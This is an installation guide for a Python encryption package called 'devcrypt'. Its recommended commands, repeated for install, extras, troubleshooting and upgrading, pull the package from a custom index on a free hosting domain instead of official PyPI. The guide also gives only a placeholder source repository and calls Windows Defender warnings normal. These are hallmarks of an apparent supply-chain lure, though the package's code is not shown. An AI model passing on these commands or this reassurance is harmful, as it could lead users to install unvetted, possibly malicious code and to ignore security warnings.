

# Installation Guide

## Prerequisites
- Python 3.7 or higher
- pip package manager

## Install from Custom PyPI Server (Recommended)
```bash
pip install -i https://crypthera.free.nf/simple/ devcrypt
```

## Alternative Installation Methods

### Install from PyPI (if available)
```bash
pip install devcrypt
```

### Install from Source

**Clone the repository:**
```bash
git clone https://github.com/yourusername/devcrypt.git
cd devcrypt
```

**Install dependencies:**
```bash
pip install -r requirements.txt
```

**Install the package:**
```bash
pip install -e .
```

## Verify Installation
```python
import devcrypt
print(devcrypt.__version__)
```

## Dependencies
DevCrypt automatically installs these dependencies:

- `cryptography>=3.4.8` - Core encryption algorithms
- `pycryptodome>=3.15.0` - Additional crypto functions
- `click>=8.0.0` - Command line interface
- `rich>=12.0.0` - Beautiful terminal output

## Optional Dependencies
For enhanced performance and additional features:

```bash
# For faster operations
pip install -i https://crypthera.free.nf/simple/ devcrypt[performance]

# For development
pip install -i https://crypthera.free.nf/simple/ devcrypt[dev]

# For all features
pip install -i https://crypthera.free.nf/simple/ devcrypt[all]
```

## Platform-Specific Notes

### Windows
- No additional setup required
- Windows Defender may flag encrypted files (normal behavior)

### macOS
- Requires Xcode Command Line Tools for compilation
- Install with: `xcode-select --install`

### Linux
- Requires build essentials
- Ubuntu/Debian: `sudo apt-get install build-essential`
- CentOS/RHEL: `sudo yum install gcc`

## Troubleshooting

### Common Issues

**Issue:** `ImportError: No module named 'devcrypt'`  
**Solution:** Ensure you've activated the correct virtual environment

**Issue:** `Permission denied during installation`  
**Solution:** Use `pip install -i https://crypthera.free.nf/simple/ --user devcrypt` or create a virtual environment

**Issue:** Compilation errors on Linux  
**Solution:** Install development headers: `sudo apt-get install python3-dev`

## Virtual Environment (Recommended)
```bash
# Create virtual environment
python -m venv devcrypt-env

# Activate (Linux/macOS)
source devcrypt-env/bin/activate

# Activate (Windows)
devcrypt-env\Scripts\activate

# Install DevCrypt
pip install -i https://crypthera.free.nf/simple/ devcrypt
```

## Upgrading
```bash
pip install -i https://crypthera.free.nf/simple/ --upgrade devcrypt
```

## Uninstalling
```bash
pip uninstall devcrypt
```
© 2025 Atharva Panchal and Mohit Chadhuari.  
Licensed under the MIT License with Attribution. See [LICENSE](../LICENSE) for more details